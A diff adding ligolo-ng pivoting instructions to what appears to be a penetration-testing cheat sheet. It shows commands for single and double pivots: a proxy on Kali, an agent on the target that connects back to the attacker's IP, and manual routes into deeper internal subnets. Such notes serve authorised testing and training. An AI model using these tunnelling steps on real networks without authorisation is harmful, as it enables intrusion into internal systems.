@@ -1310,6 +1310,34 @@ https://github.com/sysdream/ligolo
 ```
 https://github.com/nicocha30/ligolo-ng
 https://github.com/gunyakit/command-cheatsheet/blob/main/5.Lateral-Movement/5.3.Ligolo-ng-Complete-Guide.md
+
+# Single Pivot
+# On Kali
+$ ./proxy --selfcert
+
+# On Target
+$ ./agent -connect <Kali IP address>:11601 -ignore-cert
+
+# On Kali
+ligolo-ng » session
+Select the session with arrow keys and Enter
+ligolo-ng » autoroute
+Select the route with arrow keys, and Spacebar and Enter
+Create a new interface named ligolo
+Start the tunnel
+
+# Double Pivot (do single pivot first)
+# Autoroute only offers the agent's own interface subnets. When the network you want is behind the second pivot's gateway (not one of its NICs), it won't appear in the picker — so you create a dedicated interface and add the route by hand.
+
+# On Target
+$ ./agent -connect <Kali IP address>:11601 -ignore-cert
+
+# On Kali
+ligolo-ng » session
+Select the new session with arrow keys and Enter
+ligolo-ng » interface_create --name ligolo2
+ligolo-ng » interface_add_route --name ligolo2 --route <new CIDR range that you want to access>
+ligolo-ng » start --tun ligolo2
 ```
 
 - Socat
